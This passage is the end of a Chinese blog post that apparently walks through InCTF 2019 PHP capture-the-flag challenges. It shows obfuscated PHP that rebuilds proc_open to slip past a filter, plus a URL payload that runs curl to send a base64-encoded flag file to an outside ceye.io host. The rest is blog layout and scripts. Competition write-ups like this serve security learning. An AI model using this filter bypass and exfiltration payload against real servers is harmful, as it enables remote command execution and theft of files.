+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _</span></span><br><span class="line">$b=c.h.r;</span><br><span class="line">$u=$b(<span class="number">95</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $_GET</span></span><br><span class="line">$k=$u.G.E.T;</span><br><span class="line">$g=$$k;</span><br><span class="line"></span><br><span class="line"><span class="comment">// proc_open(current($_GET),next($_GET), $j);</span></span><br><span class="line">$c=curr.ent;</span><br><span class="line">$n=ne.xt;</span><br><span class="line">$e=proc.$u.open;</span><br><span class="line">$e($c($g),$n($g),$j);</span><br></pre></td></tr></table></figure>
+<p>加上传参的完整proc_open()函数构造，注意proc_open()函数第一个参数必须在第一位、第二个数组参数必须紧跟其后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?cmd=curl http://xx.ceye.io/`cat flag.txt|base64|tr &apos;\n&apos; &apos;-&apos;`</span><br><span class="line">&amp;descriptorspec[0][]=pipe</span><br><span class="line">&amp;descriptorspec[0][]=r</span><br><span class="line">&amp;descriptorspec[1][]=pipe</span><br><span class="line">&amp;descriptorspec[1][]=w</span><br><span class="line">&amp;descriptorspec[2][]=pipe</span><br><span class="line">&amp;descriptorspec[2][]=w</span><br><span class="line">&amp;input=$b=c.h.r;$u=$b(95);$k=$u.G.E.T;$g=$$k;$c=curr.ent;$n=ne.xt;$e=proc.$u.open;$e($c($g),$n($g),$j);</span><br></pre></td></tr></table></figure>
+<p>最后整合的Linux版payload如下，往ceye发送flag内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=curl http://xx.ceye.io/`cat flag.txt|base64|tr &apos;\n&apos; &apos;-&apos;`&amp;descriptorspec[0][]=pipe&amp;descriptorspec[0][]=r&amp;descriptorspec[1][]=pipe&amp;descriptorspec[1][]=w&amp;descriptorspec[2][]=pipe&amp;descriptorspec[2][]=w&amp;input=$b=c.h.r;$u=$b(95);$k=$u.G.E.T;$g=$$k;$c=curr.ent;$n=ne.xt;$e=proc.$u.open;$e($c($g),$n($g),$j);&amp;thisfile=/tmp/</span><br></pre></td></tr></table></figure>
+<p>环境换在Linux上，直接用该payload打3道题，都能通杀：</p>
+<p><img src="/2019/10/20/InCTF-2019-PHP三题复现/5.png" alt=""></p>
+<p>在ceye能接收到flag信息：</p>
+<p><img src="/2019/10/20/InCTF-2019-PHP三题复现/6.png" alt=""></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://xz.aliyun.com/t/6426" target="_blank" rel="noopener">InCTF 2019 - (PHP+1, PHP+1.5 and PHP+2.5) 三题深度复现</a></p>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-题目分析"><span class="toc-text">0x01 题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1"><span class="toc-text">PHP+1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1-5"><span class="toc-text">PHP+1.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-2-5"><span class="toc-text">PHP+2.5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-题解"><span class="toc-text">0x02 题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-text">0x03 参考</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+<div class="share" style="width: 100%;">
+  <img src="" alt="" style="margin: auto; display: block;"/>
+
+  <div style="margin: auto; text-align: center; font-size: 0.8em; color: grey;">test</div>
+  
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/10/14/文件上传漏洞总结/" rel="next" title="文件上传攻击框架">
+          文件上传攻击框架
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/10/20/浅析JavaScript原型链污染攻击/" rel="prev" title="浅析JavaScript原型链污染攻击">
+            浅析JavaScript原型链污染攻击
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">本站总访问量 <span id="busuanzi_value_site_pv"></span> 次</span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
